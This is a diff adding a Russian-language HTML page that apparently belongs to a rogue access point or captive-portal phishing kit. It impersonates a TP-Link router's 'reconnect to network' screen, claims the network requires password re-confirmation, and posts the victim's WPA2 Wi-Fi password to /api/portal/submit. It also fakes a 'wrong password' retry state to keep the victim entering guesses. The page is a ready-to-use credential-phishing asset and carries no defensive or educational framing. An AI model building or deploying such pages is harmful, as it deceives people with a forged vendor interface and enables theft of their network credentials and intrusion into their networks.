@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>TP-Link — Wireless Router</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#f4f6f8;font-family:'Segoe UI',Arial,sans-serif;min-height:100vh}
+.hdr{background:#00A651;padding:0 20px;height:52px;display:flex;align-items:center;gap:12px}
+.hdr-brand{color:#fff;font-size:18px;font-weight:800;letter-spacing:1px}
+.hdr-model{color:rgba(255,255,255,.65);font-size:12px;margin-left:4px}
+.banner{background:linear-gradient(135deg,#00A651,#007a3d);padding:22px 20px 42px;color:#fff}
+.banner h1{font-size:17px;font-weight:700;margin-bottom:6px}
+.banner p{font-size:13px;opacity:.9;line-height:1.5}
+.wrap{max-width:420px;margin:-20px auto 0;padding:0 16px 36px;position:relative}
+.panel{background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.1)}
+.panel-title{background:#e8f7ef;padding:12px 20px;font-size:13px;font-weight:700;color:#007a3d;border-bottom:1px solid #d0eedd}
+.panel-body{padding:20px}
+.field{margin-bottom:14px}
+.field label{display:block;font-size:12px;color:#444;margin-bottom:5px;font-weight:600}
+input[type=text],input[type=password]{width:100%;padding:10px 12px;border:1px solid #ccd6dd;border-radius:5px;font-size:14px;outline:none;-webkit-appearance:none}
+input[type=text]:focus,input[type=password]:focus{border-color:#00A651;box-shadow:0 0 0 2px rgba(0,166,81,.12)}
+input[readonly]{background:#f7f9fb;color:#888}
+.hint{font-size:11px;color:#999;margin-top:3px}
+.btn{width:100%;padding:12px;background:#00A651;color:#fff;border:none;border-radius:5px;font-size:14px;font-weight:700;cursor:pointer;margin-top:4px;-webkit-appearance:none;position:relative}
+.btn:active{background:#007a3d}
+.spin{display:none;position:absolute;right:14px;top:50%;transform:translateY(-50%);width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite}
+@keyframes sp{to{transform:translateY(-50%) rotate(360deg)}}
+.error{display:none;background:#fff3f3;border:1px solid #f5c6cb;border-radius:5px;padding:9px 12px;font-size:12px;color:#c0392b;margin-top:8px}
+.footer{text-align:center;margin-top:14px;font-size:11px;color:#aaa}
+</style>
+</head>
+<body>
+<div class="hdr">
+  <span class="hdr-brand">TP-LINK</span><span class="hdr-model">Wireless Router</span>
+</div>
+<div class="banner">
+  <h1>Повторное подключение к сети</h1>
+  <p>Сеть <strong>{{SSID}}</strong> требует подтверждения пароля для продолжения работы.</p>
+</div>
+<div class="wrap">
+  <div class="panel">
+    <div class="panel-title">&#128274; Аутентификация Wi-Fi</div>
+    <div class="panel-body">
+      <form method="POST" action="/api/portal/submit" id="frm">
+        <input type="hidden" name="ssid" value="{{SSID}}">
+        <input type="hidden" name="vendor" value="tplink">
+        <div class="field">
+          <label>Имя сети (SSID)</label>
+          <input type="text" value="{{SSID}}" readonly>
+          <div class="hint">Текущая беспроводная сеть</div>
+        </div>
+        <div class="field">
+          <label>Пароль беспроводной сети</label>
+          <input type="password" name="password" placeholder="Введите пароль" required autocomplete="off" minlength="8">
+          <div class="hint">Ключ безопасности WPA2</div>
+        </div>
+        <button type="submit" class="btn" id="sbtn">
+          Подтвердить
+          <div class="spin" id="sp"></div>
+        </button>
+      </form>
+      <div class="error" id="err">Неверный пароль. Попробуйте ещё раз.</div>
+    </div>
+  </div>
+  <div class="footer">TP-Link Technologies Co., Ltd.</div>
+</div>
+<script>
+document.getElementById('frm').addEventListener('submit',function(){
+  document.getElementById('sp').style.display='block';
+  document.getElementById('sbtn').disabled=true;
+});
+if(new URLSearchParams(location.search).get('err')){document.getElementById('err').style.display='block';}
+</script>
+</body>
+</html>
